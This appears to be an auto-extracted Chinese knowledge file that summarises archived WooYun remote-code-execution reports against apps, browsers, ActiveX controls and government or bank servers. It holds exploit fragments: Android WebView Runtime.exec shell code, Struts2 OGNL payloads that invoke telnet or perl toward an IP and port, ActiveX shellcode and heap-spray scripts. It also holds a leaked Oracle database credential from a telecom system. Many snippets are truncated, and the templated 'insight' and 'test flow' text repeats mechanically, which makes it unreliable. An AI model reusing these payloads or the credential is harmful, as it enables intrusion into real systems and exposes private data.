# RCE 漏洞分析

> 自动提取于 2026-01-23 18:57
> 样本数量: 3

## 元思考模式

### 攻击模式分布
```
  执行: 3次
```

## 典型案例

### 案例 1: wooyun-2014-071487
**标题**: 撸啊撸多玩盒子APP远程命令执行漏洞
**原始类型**: 漏洞类型：远程代码执行
**URL示例**: 
  - `https://example.com/[已脱敏]`
**洞察提取**:
**Payload片段**:
  ```
  org/papers/548我的android系统是4.1.2function execute(cmdA
  ```
  ```
  orName("java.lang.Runtime").getMethod("getRuntime",n
  ```
  ```
  ;} #1成功在动态圈子发表的帖子#2接口
  ```

### 案例 2: wooyun-2014-050162
**标题**: dolphin zero APP远程代码执行漏洞
**原始类型**: 漏洞类型：远程代码执行
**URL示例**: 
  - `https://example.com/[已脱敏]`
**洞察提取**:
  - 还是android webview接口问题问题产生原因详见：https://example.com/[已脱敏]
**Payload片段**:
  ```
  android webview接口问题问题产生原因详见：https://example.com/[已脱敏]
  ```
  ```
  or (var obj in window) {if ("getClass" in window[obj
  ```
  ```
  <script>var i=0;function getContents(inputStream){var con
  ```

### 案例 3: wooyun-2014-066107
**标题**: 飞鱼星路由器命令任意执行可ROOT控制路由
**原始类型**: 漏洞类型：远程代码执行


---

## 批次 2 (索引 200-399)
> 样本数量: 3

### 高频参数
```
  repo: 1次
  apkpackagename: 1次
  error: 1次
  packagename: 1次
  intent: 1次
```

### 典型案例

#### wooyun-2015-0145365
**某搜索引擎输入法安卓版存在远程获取信息控制用户行为漏洞（可恶意推入内容等4G网络内可找到目标）**
- 参数: `repo, apkpackagename, error, packagename, intent`
- Payload: `oreign Address         State       PID/Program namet`

#### wooyun-2014-048949
**114网址导航(app)命令执行**
- Payload: `org/papers/548<script>function execute(cmdArgs) {ret`

#### wooyun-2011-01334
**某电商平台某电商IM工具远程ActiveX溢出0DAY**
- Payload: `<script>var buffer = '';while (buffer.length < 1111) buff`

---

## 批次 3 (索引 400-599)
> 样本: 2

### 典型案例

#### wooyun-2013-033347
**某高校商学院Struts2命令执行**

#### wooyun-2012-09915
**著名站点sourceforge分站沦陷**

---

## 批次 4 (索引 600-799)
> 样本: 3

### 高频参数
```
  id: 1
  url: 1
```

### 典型案例

#### wooyun-2013-044771
**全球第三大管理软件厂商赛捷(SAGE)ERP产品存在通用型远程代码执行**
- 参数: `id`

#### wooyun-2015-092544
**某搜索引擎浏览器7.0.600 bdbrowser://协议泄露可读取历史列表等等**
- 参数: `url`

#### wooyun-2014-077978
**某IM软件2015APP远程代码执行漏洞+漏洞利用POC(可攻击指定用户)**
- Payload: `<script type="text/javascript">for(w in window){document.`
---
### [wooyun-2014-066531] 4G浏览器远程代码执行漏洞
**厂商**: roboo.com | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 下载懦豹4G浏览器：https://example.com/[已脱敏]

**POC**: 搜索addJavascriptInterfaceNavigator接口漏洞构造一个写文件+弹窗的Exp：<html><head><title>test</title></head><body><script>function execute(testcmd){return Navigator.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/system/bin/sh","-c","echo 'Webview远程

**绕过**: 直接利用

**修复**: :)
---

---
### [wooyun-2012-09541] 国家公信网远程执行
**厂商**: 公信网 | **年份**: 2012 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这个貌似是国家机构吧，求证书求证书
---

---
### [wooyun-2012-07456] windows live(msn)点开Msn执行本地文件、命令
**厂商**: 微软 | **年份**: 2012 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 请参见WooYun: 某互联网公司点开某互联网公司消息 执行本地文件、命令原理一样····阿普大大别见怪。。抄袭了你的思路

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 我不懂
---

---
### [wooyun-2015-0144554] 暴风影音客户端可被中间人攻击远程执行（附演示视频）
**厂商**: 暴风影音 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 安装完暴风影音  进入主界面的时候   在左下角有两个功能 （暴风游戏）（轻风频道）点击暴风游戏的的时候 ,弹出来一个提示！于是抓包研究了一番  !改包然后提交   ！我在服务器上传了一个文件  命名为:BF-BFGame.exe  并且看到文件被成功下载了！静待几秒！成功下载并且执行了远程下载的计算器！短视频下载地址: https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 校验返回的文件的数字签名！
---

---
### [wooyun-2011-01311] 某下载工具ActiveX控件栈溢出漏洞
**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞存在于某浏览器插件.dll中，对unicode编码的URL没有做有效的长度检测导致一个栈溢出漏洞，由于新版已加入/gs编译选项，即使能覆盖异常处理，但无法在函数返回前触发异常而获得控制权限。

**POC**: <html><script language="javascript">url = "ftp://"for (var i = 0; i < 0x300; i ++){url += "\u4141\u4141";}var s = new ActiveXObject("某浏览器插件.某浏览器功能.2");s.SendUrl4(url, "http://[IP已脱敏]", "test", "", 0, 0, "", "", "");</script></html>

**绕过**: 编码绕过

**修复**: 长度检测啊啊啊啊～～
---

---
### [wooyun-2016-0166496] 中国铁建某站存在java反序列化漏洞
**厂商**: 中国铁建 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国铁建某站存在java反序列化漏洞。地址：http://**.**.**.**:7001/logonAction.do

**POC**: 中国铁建某站存在java反序列化漏洞。地址：http://**.**.**.**:7001/logonAction.do

**绕过**: 直接利用

**修复**: .....
---

---
### [wooyun-2015-0106714] 某银行信用卡客户端某银行APP存在远程调试界面
**厂商**: 某银行 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 认证接口

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞危害：某银行APPAndroid客户端用户能轻易设置“用户登录”调试界面，导致某银行信用卡网站web API暴露，影响客户端安全性。成因分析：可能是开发人员把程序的测试版本错误地发布给用户。

**POC**: 1、从网站上下载并安装了某银行APPAndroid V3.3.13后，客户端会推送V3.4.2，直接安装升级。2、启动新的客户端V3.4.2，在主界面的“花瓣”菜单随便点一栏，例如“在线影院”，再点击手机的“menu键”，在弹出的菜单中选择“设置”， 客户端会出现了标题为“用户登录”的调试界面。3、在界面下部的众多按钮中随便点击，例如“生产”按钮，entry-1和server文本框就会显示相应的调试url，并弹出若干提示。部分url含有”Payment”，我怀疑跟某银行的支付API有关。部分url以http为前缀，并无SSL加密。

**绕过**: 直接利用

**修复**: 开发人员重新编译并发布新版本，把该调试界面去除，并最好调整API调用方式。
---

---
### [wooyun-2015-0161450] 某农商银行某系统远程代码执行漏洞
**厂商**: 某农商银行 | **年份**: 2015 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 功能测试

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**:7001/defaultroot/login.jsp翻翻网站目录，然后ftp下载一个jsp馬上去，然后转发一下远程端口，这里就不一一测试了

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0111084] 猥琐流绕过任意反病毒软件防御体系/破坏反病毒软件/本地任意代码执行/远程任意代码执行
**厂商**: CNCERT | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某年月日，打完LOL，是时候关一波机了，然后。。。某应用程序无响应- -哎？某些无响应没有被关闭，那是不是其他的都被关闭了呢？我们先来看看Windows的关机机制：System Signal -> Shutdown Process -> Power Off既然这样，那我们是不是可以捕获信号，趁各种杀软都gg了的时候干掉他们或执行代码or其他程序？MSDN告诉我们，Windows提供用于监测系统事件的API，比如关机和注销。此处正在写代码- -好了~，核心一句话，通过Cancel方法来阻止关机，然后执行测试。本地实测拦截成功。好的，然后插入自己的代码吧。想破坏就删程序，想过悄无声息得以后随意过主动就插证书，还可以远程执行脚本嘛~ 随意随意~ 先测试个破坏杀软吧。（插证书和删杀软需要管理权限，只是执行自定义代码不需要。）此处又在写代码- -Ok，改一下，kill掉文件就可以。测试机装的金山小卫

**POC**: EXP源码，可下载测试。（C#.Net）（例子是金山卫士）GitHub：https://example.com/[已脱敏] - 我这么渣的代码就不挂上去了。。。

**绕过**: 直接利用

**修复**: 暂时禁止AutoEndTasks改动应该是个办法，大概能用。不知道360是怎么做到的，难道是把自己作为系统核心进程？！
---

---
### [wooyun-2016-0171125] 查漏补缺之台湾joomla代码执行打包-学校（臺灣地區）
**厂商**: Hitcon台湾互联网漏洞报告平台 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: joomla代码执行**.**.**.**     專利技術媒合平台 - 某高校 | 專利技術媒合平台**.**.**.**   某高校崇德社**.**.**.**   http://**.**.**.**/    某高校創意設計學位學程**.**.**.**   海事資訊科技系暨研究所

**POC**: 如上

**绕过**: 直接利用

**修复**: 升级最近版
---

---
### [wooyun-2015-0145283] 某安全厂商aSV漏洞第一弹之Remote Code Execution
**厂商**: 某安全厂商 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 利用此漏洞前提：需要登陆aSV控制台而且权限较低（www-data），所以自评漏洞为中问题代码出在qrencode.pl上，程序猿自己回去检查#!/usr/bin/perl -w#1、获取传入参数my $r = Apache2::RequestUtil->request();my $cgi = CGI->new($r);my $need_encode_intext = $cgi->param( 'need_encode_intext' );exit (0) if(!defined($need_encode_intext) || ($need_encode_intext eq ""));#2、根据传入参数得到二维码图片my $qrencode_png_name = 'tmp_qrencode.png';my $qrencode_png_path = "/tmp/$qrencode_png_n

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们懂的
---

---
### [wooyun-2016-0166769] 某省地方税务局某系统存在java反序列化漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 云南省地方税务局门户系统存在java反序列化漏洞漏洞url：**.**.**.**:7001/console/login/LoginForm.jsp1、查看用户权限2、查看IP

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 升级weblogic
---

---
### [wooyun-2014-075003] 某音乐APP安卓客户端存在webview 代码执行漏洞
**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-049946] 某安全浏览器Pad版远程代码执行漏洞
**厂商**: 某安全厂商 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 浏览器来说这种问题还是需要修补的导出searchBoxJavaBridge_好像是跟google的搜索框相关的。在android 4.0手机上测试实际存在，4.2以上版本不存在function execute(cmdArgs){return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}测试页面:https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 需要把这个接口删除，调用removeJavascriptInterface方法https://example.com/[已脱敏]
---

---
### [wooyun-2015-0160347] 某省联通公司某系统java反序列化漏洞导致服务器被入侵
**厂商**: 某省联通公司 | **年份**: 2015 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 认证接口

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**:7001/已经进远程ssh，登录服务器

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2010-0267] 国泰君安证券富通页面交易安全控件存在远程溢出漏洞
**厂商**: 国泰君安 | **年份**: 2010 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 文件：CsswebLogin.ocx版本：[IP已脱敏] & [IP已脱敏]clsid:F43B35B7-C29A-453F-86E9-C37412269D62属性：SetPswStr

**POC**: Heap Spray,大家都懂得

**绕过**: 直接利用

**修复**: 限制参数长度
---

---
### [wooyun-2015-095498] 海豚浏览器最新版远程代码执行漏洞
**厂商**: 海豚浏览器 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 多个接口存在js注入等问题写文件exp：<html><head><title>test</title></head><body><script>function execute(testcmd){return Android.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/system/bin/sh","-c","echo 'Webview远程命令执行漏洞测试.' > /sdcard/paxmac.txt"])

**绕过**: 直接利用

**修复**: 仔细检查这些接口。做一下处理吧。
---

---
### [wooyun-2016-0171660] 某运营商某重要系统漏洞可以登录全国大量联通手机号进入网厅操作
**厂商**: 某运营商 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 认证接口

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 所有联通用户均已躺枪...1. 某运营商某重要系统漏洞理论可以登录全国所有联通手机号进入网厅操作【亲测：18666666666】2. 可查询所有联通手机号码发送给10010的短信以及系统回复的短信内容【流量/积分/余额/WLAN密码等等】某运营商江西网站管理系统存在反序列化执行漏洞**.**.**.**:7001/efbadmin/

**POC**: getshell：**.**.**.**:7001/uddi/unicome.jsp  wooyun收集关键配置信息：bms.url=jdbc:oracle:thin:@**.**.**.**:1525/ecombms.username=ltzbyytbms.password=l4t5z9b7t0yt收集到大量联通人员的账号密码 邮箱 手机号  社工的信息通过数据库操作还可找到更多邮箱账户及密码

**绕过**: 直接利用

**修复**: 听说来乌云会有钱？
---

---
### [wooyun-2014-066796] UC某版本浏览器存在代码执行漏洞
**厂商**: UC Mobile | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: UC浏览器TV版([IP已脱敏])下载链接(官方)：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-035573] 某搜索引擎音乐本地版（TTPlayer5.0）存在所处堆栈溢出可执行任意代码
**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: #!/usr/bin/pythonimport sys, time, os,zipfileimagefuzzer="A"*4096imagefuzzer1="A"skinxmltmp="<skin version=\"2\" name=\"fuck\" author=\"fucker\" url=\"https://example.com/[已脱敏]" email=\"fucker@fucker.com\" transparent_color=\"#ff00ff\">\<player_window image=\"" + imagefuzzer1*512 + """ "><play position="8,

**绕过**: 直接利用

**修复**: 检查缓冲区长度
---

---
### [wooyun-2013-042025] 金山卫士远程代码执行
**厂商**: 金山毒霸 | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 金山卫士在处理相关保护的时候存在hijack现象，其中保存kswebshield.dll、ksfmon.dll模块，而ksfmon.dll用消息钩子注射到所有处理消息的进程中。换句话说就是安装了金山卫士所有程序都可以被dll hijack了，hijack模块为kernelbase.dll。看图吧word中招winrar中招迅雷中招

**POC**: 为什么说是远程呢？放到共享文件夹远程访问打开即中招。当然放webdav也一样

**绕过**: 直接利用

**修复**: 说得很详细了，程序员懂
---

---
### [wooyun-2014-050247] SooyieCMS存在通用性远程代码执行
**厂商**: CNCERT | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 产品分为aspx和jsp版本 jsp大部分用于govhttps://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-036272] 某省教育厅某个业务系统漏洞
**厂商**: 某省教育厅 | **年份**: 2013 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 陕西省中小学学籍管理系统http://[IP已脱敏]

**POC**: 使用shack2 兄弟的Struts2漏洞利用工具其他的就不演示了。如果你不相信的话，我可以说一点边缘的佐证，这个学籍管理系统是15个虚拟机构建的集群，部署在那个所谓的云平台上。

**绕过**: 直接利用

**修复**: 1. 更新Struts2补丁；2. 检查文件系统的完整性。
---

---
### [wooyun-2012-07813] 某手机游戏某站远程代码执行漏洞
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]]%27%29%28meh%29=true&%28aaa%29%28%28%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003d\u0023foo%27%29%28\u0023foo\u003dnew%20java.lang.Boolean%28%22false%22%29%29%29&%28asdf%29%28%28%27\u0023rt.exec%28%22%20perl%20\u002ftmp\u002fspider\u005fbc%20183.20.164.224%2012345%20%22%

**POC**: ?('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('\u0023rt.exec(%22 telnet [IP已脱敏] 12345 %22)')(\u0023rt \u003d@java.lang.Runtime@g

**绕过**: 直接利用

**修复**: 这个老漏洞了 官网补丁下行了,好像这个业务暂停了的,某互联网公司整理下吧.有小礼物么 me and @顺子
---

---
### [wooyun-2016-0167798] 某市人力资源和社会保障局某站java反序列化漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 威海市人力资源和社会保障局某站java反序列化漏洞。地址：**.**.**.**:7001/hso/logonDialog_113.jsp

**POC**: 威海市人力资源和社会保障局某站java反序列化漏洞。地址：**.**.**.**:7001/hso/logonDialog_113.jsp

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-07517] 迅雷看看组件利用远程执行指定程序漏洞
**厂商**: 迅雷 | **年份**: 2012 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 利用 https://example.com/[已脱敏] 希望尽快修复

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 利用价值这么大 没有想到修复的地步 够你们忙一阵子了
---

---
### [wooyun-2012-016705] 010 Edit 缓冲区溢出漏洞
**厂商**: SweetScape | **年份**: 2012 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 当用户使用Calculator执行恶意构造的的命令时，会触发缓冲区溢出。问题代码所在位置，由于两次向缓冲区赋值，计数却只减一，导致缓冲区被覆盖溢出

**POC**: 触发漏洞的poc：0x23, 0x64, 0x65, 0x66, 0x69, 0x6E, 0x65, 0x20,0x61, 0x20, 0x22, 0x5C, 0x61, 0x5C, 0x61, 0x5C,0x61, 0x5C, 0x61, 0x5C, 0x61, 0x5C, 0x61, 0x5C,0x61, 0x5C, 0x61, 0x5C, 0x61, 0x5C, 0x61, 0x5C,0x61, 0x5C, 0x61, 0x5C, 0x61, 0x5C, 0x61, 0x5C,0x61, 0x5C, 0x61, 0x5C, 0x61, 0x5C, 0x61, 0x5C,0x61, 0x5

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-062585] 八通网任意代码执行（目测服务器已沦陷）
**厂商**: 八通网 | **年份**: 2014 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 上传功能

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: nginx/0.8.54 的随便找个上传的地方就行了

**POC**: 主站已被黑产目录已经被设置强制隐藏了 目测服务器已被提权了

**绕过**: 直接利用

**修复**: 服务器需要整理一下了另外网站是整合了DEDECMS DZ 74CMS 等众多程序 配合各种姿势执行 说不定数据库里面已经被留各种后门了所以这里提醒下 别忘记数据库估计又是一次大手术了
---

---
### [wooyun-2015-099026] 2345输入法本地权限提升执行漏洞
**厂商**: 2345网址导航 | **年份**: 2015 | **类型**: 权限提升

**元思考**: 触发信号: 参数注入

**洞察**: 权限提升防护不足，开发者信任前端输入

**测试流程**:
1. 识别权限提升相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 版本：2.3 大小：28M  更新日期:2015.02.04两处存在使用CreateProcess()函数创建新的进程及其主线程，对于CreateProcess函数，Window规定如果传入的启动程序名称和参 数中包含空格，那么这些名称和参数在传入给CreateProcess函数之前必须用双引号””进行包含，比如c:/program files/sub dir/program name，如果不用””包含，则Window可能会产生歧异。安装2345输入法时2345PinyinSvc.exe可信任路径代码执行漏洞和2345输入法的设置功能2345PinyinConfig.exe可信任路径代码执行漏洞参考：WooYun: 某搜索引擎输入法调用CreateProcess函数漏洞

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 某搜索引擎
---

---
### [wooyun-2011-01386] 皮皮播放器ActiveX出现溢出漏洞第三波
**厂商**: 皮皮网 | **年份**: 2011 | **类型**: 远程代码执行

**元思考**: 触发信号: 参数注入

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 皮皮播放器Acitvex控件JfCheck.dll的setCookie第二个参数未经过有效的安全检查，导致栈溢出。攻击者可以利用此漏洞进行挂马

**POC**: <html><body><object classid='clsid:632C6705-17AB-4407-9281-F60D0A7726BE' id="target"></object><script>shellcode = unescape('%uc931%ue983%ud9de%ud9ee%u2474%u5bf4%u7381%u3d13%u5e46%u8395'+'%ufceb%uf4e2%uaec1%u951a%u463d%ud0d5%ucd01%u9022%u4745%u1eb1'+'%u5e72%ucad5%u471d%udcb5%u72b6%u94d5%u77d3%u0c9e%u

**绕过**: 直接利用

**修复**: 对参数进行检查
---

---
### [wooyun-2014-068662] 某下载APP远程代码执行漏洞
**厂商**: 迅雷 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 参考:https://example.com/[已脱敏] execute(cmdArgs){return share.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}

**POC**: 1,左上角,网页浏览方式2,接口已出

**绕过**: 直接利用

**修复**: 参见:https://example.com/[已脱敏]
---

---
### [wooyun-2013-042144] PHPYun本地文件包含造成任意代码执行
**厂商**: php云人才系统 | **年份**: 2013 | **类型**: 文件包含

**元思考**: 触发信号: 参数注入

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞出现在plus/outside.php第10行直接访问这个php，参数传入要包含的文件路径。调用方式：[IP已脱敏]

**POC**: 漏洞出现在首先构造一个jpg文件，里面写入要执行的代码然后通过上传形象照，将图片上传上去。然后找到图片的位置然后访问

**绕过**: 直接利用

**修复**: 对id进行过滤限制该文件的直接访问
---

---
### [wooyun-2015-0120513] 金山安全套装（新毒霸"悟空"+ 金山卫士）远程代码执行漏洞
**厂商**: 金山毒霸 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 金山网络防护模块kswebshield.dll存在漏洞该函数对HTTP回应包进行解析，查找数据包中是否存在“Content-Range:”字段，然后对后续的“bytes”字段进行查找，返回的地址放入v5种，然后从v5开始查找“－”，得到位置v7，后面调用 memcpy_0(String, v6, v7 - (_DWORD)v6)讲数据拷入String中，并未校验长度，导致缓冲区溢出，最终任意代码执行通过IDA，简单查看调用链，可以看到该函数是WSARecv的挂钩函数，也就是说凡事采用了WSARecv的接收数据的程序，加载该库之后都存在任意代码执行问题此外，int __stdcall sub_1008D1F0(int a1)函数海存在一个整形溢出漏洞，如题，v10的比较存在问题

**POC**: 以ie为例，构造poc，监听本地80端口打开之后，可以看到弹出了计算器

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-028533] 金山WPS存在安全漏洞可能导致任意代码执行
**厂商**: 某软件厂商 | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WPS抢先版主程序wps.exe、wpp.exe、et.exe存在dll劫持风险，wps.exe在启动时会加载wpsrw.dll，wpp.exe在启动时会加载wpprw.dll和uofswr.dll,et在启动时会加载uofssrw.dll，这些dll在本地不存在，如果黑客将htm格式的文件加上上述对应的恶意dll打包放在一起，发给用户。诱使用户打开上述格式文件，就会执行恶意程序，危害较大。

**POC**: 1、随便建个文件夹，再将证明漏洞的wpprw.dll与test.htm放在一起，用wps演示打开test.htm，就会加载wpsrw.dll，如下图：2、Poc见https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 使用LoadLibrary API加载DLL时使用绝对路径
---

---
### [wooyun-2014-061992] Open EDX云服务器远程任意代码执行漏洞
**厂商**: edx.org | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: [IP已脱敏]222.249.250.83118.122.124.188Elasticsearch代码执行国外就不例举了  通知也没人修某高校ifLab云计算小组

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2011-01630] PIPI播放器溢出漏洞
**厂商**: 皮皮网 | **年份**: 2011 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

